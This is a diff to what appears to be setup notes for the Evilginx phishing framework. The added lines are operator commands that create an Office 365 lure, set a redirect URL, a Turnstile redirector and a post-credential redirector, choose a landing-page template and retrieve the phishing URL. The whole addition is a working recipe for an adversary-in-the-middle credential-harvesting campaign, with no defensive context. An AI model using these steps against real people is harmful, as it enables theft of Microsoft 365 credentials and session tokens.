@@ -92,4 +92,34 @@ sudo ./install.sh
 evilginx-start
 config ipv4 external YOUR_PUBLIC_IP
 domains set phishing.example.com
+
+
+
+# Create lure for enabled phishlet
+lures create o365
+
+# Edit lure to set redirect URL (where they go AFTER fishing)
+lures edit 0 redirect_url YOUR_EXTERNAL_URL
+
+- Change the redirector for a lure:
+  - [lures edit <id> redirector <path>]
+- Change the post-credential redirector:
+  - [lures edit <id> post_redirector <path>]
+
+
+
+ # You can edit the Path to your predefined paths.. 
+
+  lures edit 0 redirector o365_turnstile
+
+  lures edit 0 post_redirector o365_post
+
+  landing-pages set 0:o365/default
+
+  landing-pages list
+landing-pages set <lure_id>:<category/template>
+
+
+  # Get the phishing URL
+lures get-url 0
 ```
